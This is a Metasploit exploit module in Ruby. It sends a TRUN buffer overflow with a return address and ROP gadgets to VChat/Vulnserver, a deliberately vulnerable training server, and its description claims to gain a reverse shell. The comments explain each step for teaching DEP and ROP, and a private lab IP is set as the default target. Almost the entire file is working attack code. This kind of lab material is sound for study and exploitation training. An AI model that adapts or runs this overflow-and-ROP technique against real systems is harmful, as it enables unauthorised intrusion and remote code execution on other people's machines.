##
# The # symbol starts a comment
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: /usr/share/metasploit-framework/modules/exploit/windows/VChat/TRUN_BDEP.rb
##
# This module exploits the TRUN command of vulnerable chat server to  showcase DEP protections
##

class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
  Rank = NormalRanking	# Potential impact to the target

  include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module

  def initialize(info = {})	# i.e. constructor, setting the initial values
    super(update_info(info,
      'Name'           => 'VChat/Vulnserver Buffer Overflow-TRUN command',	# Name of the target
      'Description'    => %q{	# Explaining what the module does
         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell.
      },
      'Author'         => [ 'fxw' ],	## Hacker name
      'License'        => MSF_LICENSE,
      'References'     =>	# References for the vulnerability or exploit
        [
          #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
          [ 'URL', 'https://github.com/DaintyJet/VChat_ROP_INTRO' ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done
        },
      'Payload'        =>	# How to encode and generate the payload
        {
          'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
        },
      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>	#  targets for many exploits
      [
        [ 'EssFuncDLL-RET',
          {
            'retn' => 0x62501029,  # This will be available in [target['retn']]
            'popeax' => 0x62501028,
            'inceax' => 0x62501192
          }
        ]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
      register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
          [
          OptInt.new('RETOFFSET', [true, 'Offset of Return Address in function', 1995]),
          Opt::RPORT(9999),
          Opt::RHOSTS('192.168.7.191'),
      ])
  end
  def exploit	# Actual exploit
    print_status("Connecting to target...")
    connect	# Connect to the target

    # Payload Unused, This can be converted to one which just sends a shellcode file by uncommenting this and modifying
    # the outbound string
    # if datastore['PAYLOADSTR'] && !datastore['PAYLOADSTR'].empty?
    #   shellcode = payload.encoded.gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
    # else
    #   shellcode = payload.encoded
    # end

    # If you want to control the binary string
    #outbound = 'TRUN /.:/' + "A"*datastore['RETOFFSET'] + [target['retn']].pack('V') + shellcode + "\x90" * 990 # Create the malicious string that will be sent to the target
    outbound = 'TRUN /.:/' + "A"*datastore['RETOFFSET'] + [target['retn']].pack('V') + [target['popeax']].pack('V') + [0xABCDABB9].pack('V') + [target['inceax']].pack('V') + "\x90" * 990 # Create the malicious string that will be sent to the target

    print_status("Sending Exploit")
    sock.put(outbound)	# Send the attacking payload

    disconnect	# disconnect the connection
  end
end